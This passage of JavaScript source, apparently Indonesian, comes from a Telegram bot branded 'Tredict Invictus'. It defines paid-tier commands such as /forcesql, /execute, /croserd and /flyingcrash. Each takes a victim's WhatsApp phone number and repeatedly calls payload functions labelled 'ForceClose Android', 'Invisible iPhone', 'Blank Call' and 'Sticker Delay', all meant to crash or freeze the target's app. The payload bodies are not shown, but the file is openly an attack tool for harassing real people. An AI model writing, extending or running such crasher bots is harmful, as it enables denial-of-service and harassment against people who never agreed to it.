<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);
//Menu Bug
bot.command(
  "bufferdelay",
  checkWhatsAppConnection,
  checkSVIP,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/bufferdelay";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /bufferdelay 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible Delay Infinity
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 1 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

     await ZhTHxhChanges(sock, target);
      await ctarlResponse(target);
      await glorymessage(target);
      await obfuspot(target);
      await gsGlx(target);
      await ctarlResponse(target);
      await gsGlx(target);
      await ZhTHxhChanges(sock, target);
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible Delay Infinity 
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);
//FC INCIS
bot.command(
  "forcesql",
  checkWhatsAppConnection,
  checkSVIP,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/forcesql";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /forcesql 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> ForceClose Infinity
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 1 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

     await plaintext(sock, target, true);
      await privatedelay();
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible Force
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);
bot.command(
  "stickerfc",
  checkWhatsAppConnection,
  checkSVIP,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/stickerfc";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /stickerfc 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Sticker Force
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 10 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

     await StickerForce(sock, target);
      await privatedelay();
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible Force Sticker
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);
//MENU KEDUA//
bot.command(
  "execute",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/execute";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /execute 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible iPhone 
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 10 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

     await privatedelay();
       await InvisibleIphone(target);
    await InvisibleIphone(target);
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible iPhone
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);

bot.command(
  "hoxlive",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/hoxlive";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /hoxlive 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> ForceClose Iphone
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 10 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

    await privatedelay();
       await NewExtendIOS(target);
    await NewExtendIOS(target);
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> ForceClose Iphone  
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);

bot.command(
  "destiny",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/destiny";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /destiny 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible No Tag Story  
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 10 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

      await privatedelay();
      await ZhTHxhChanges(sock, target);
      await ctarlResponse(target);
      await glorymessage(target);
      await obfuspot(target);
      await gsGlx(target);
      await ctarlResponse(target);
      await gsGlx(target);
      await ZhTHxhChanges(sock, target);
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible No Tag Story  
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);

bot.command(
  "obfors",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/obfors";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /obfors 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Blank Call  
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });
    const msgId = sendMsg.message_id;
    for (let i = 0; i < 10 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }
      if (!bugIntervals[target]) break;
      await MentionedJid(sock, target);
    await BlankMention(sock, target);
      await privatedelay();
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Blank Call  
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);

bot.command(
  "flyingcrash",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/flyingcrash";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /flyingcrash 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible ForceClose  
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 10 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

      await plaintext(sock, target, true);
    await plaintext(sock, target, true);
      await privatedelay();
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Invisible ForceClose  
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);

bot.command(
  "creodash",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/creodash";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /creodash 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> ForceClose Delete Message
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 10 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

    await FORCEDELETE(sock, target, true);
      await privatedelay();
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> ForceClose Delete Message  
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);

bot.command(
  "croserd",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/croserd";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /croserd 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> ForceClose Android
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 10 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

    await croserd(sock, target, true);
      await privatedelay();
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> ForceClose Android  
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);

bot.command(
  "delaysticker",
  checkWhatsAppConnection,
  checkSVIP,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/creodash";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /creodash 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Sticker Delay
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 10 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

   await stickerDelay(sock, target);
      await stickerDelay(sock, target);
      await privatedelay();
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Sticker Delay  
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);

bot.command(
  "gloryposx",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (!menuEnabled) {
      return ctx.reply("⚠️ Script sedang dimatikan karena dibagikan sembarangan.");
    }
    if (!tokenValidated) return;

    const commandName = "/gloryposx";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /gloryposx 62xxxx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!activeBugs.includes(target)) activeBugs.push(target);

    bugIntervals[target] = true;

    bugMeta[target] = {
      user: username,
      userId: userId,
      command: commandName,
      target: q,
      startTime: new Date(),
    };
    // ==========================

    const sendMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Blank Call
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Gold Execute Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
      }
    });

    const msgId = sendMsg.message_id;
    for (let i = 0; i < 10 && bugIntervals[target]; i++) {
      for (let p = 0; p <= 100; p++) {
        if (!bugIntervals[target]) break;
        await new Promise((res) => setTimeout(res, 10));
      }

      if (!bugIntervals[target]) break;

       await sendOfferAll(sock, target);
    await sendOfferAll(sock, target);
      await privatedelay();
      await new Promise((res) => setTimeout(res, 500));
    }

    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msgId,
      null,
      `
<b><u>Tredict Invictus</u></b>

<b>👤 User :</b> ${username}
<b>🆔 User ID :</b> <code>${userId}</code>
<b>🛠 Command :</b> ${commandName}

<b>⟢ Target :</b> ${q}
<b>⟢ Mode :</b> Call Blank  
<b>⟢ Status :</b> <i>Success ✓</i>

<b>🐰 Blue Rose Execution Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]]
        }
      }
    );
  }
);

